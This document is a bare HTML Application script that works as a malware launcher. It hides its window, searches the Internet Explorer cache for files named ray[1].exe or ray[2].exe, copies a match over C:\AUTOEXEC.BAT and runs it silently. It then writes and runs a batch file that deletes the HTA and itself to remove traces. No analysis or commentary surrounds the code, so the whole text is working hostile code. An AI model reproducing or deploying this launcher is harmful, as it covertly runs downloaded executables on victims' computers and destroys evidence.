   <HTML><BODY><HEAD><SCRIPT language=JScript>window.moveTo(3000,3000);window.resizeTo(0,0);</SCRIPT></HEAD>
   <HTA:APPLICATION ID=RAY BORDER="none" CAPTION="no" SHOWINTASKBAR="no" HEIGHT="0" WIDTH="0">
   <BODY scroll="no" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
   <SCRIPT LANGUAGE="JavaScript">
   function wj(b){
   try{
   var c=new Enumerator(fso.GetFolder(b).SubFolders);
   for (;!c.atEnd();c.moveNext()){var f0=c.item().Path+"\\ray[1].exe";var f1=c.item().Path+"\\ray[2].exe";
   var f="C:\\AUTOEXEC.BAT";if(fso.FileExists(f0)){fso.CopyFile(f0,f)
   wsh.Run(f,0,0);v=1;break;
   }
   if(fso.FileExists(f1)){fso.CopyFile(f1,f);wsh.Run(f,0,0);v=1;break;}wj(c.item());}}catch(e){}}
   function kill(){
   path="c:\\cmd.bat";
   v=RAY.commandLine;
   v=v.substring(1,v.length-2);
   var _w=fso.CreateTextFile(path);
   _w.Write('@echo off\r\n:A\r\ndel "'+v+'"\r\nif exist "'+v+'" goto A\r\ndel %0');
   _w.close();
   wsh.Run(path,0,false);
   window.close();
   }
   var v=0;
   try{
   var fso=new ActiveXObject("Scripting.FileSystemObject");
   var wsh=new ActiveXObject("WScript.Shell");
   var cache=wsh.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Cache");
   }catch(e){}
   function drun(){try{if(v==0){wj(cache);setTimeout("drun()",3000);}else{kill();}}catch(e){}}
   drun();</SCRIPT></BODY></HTML>
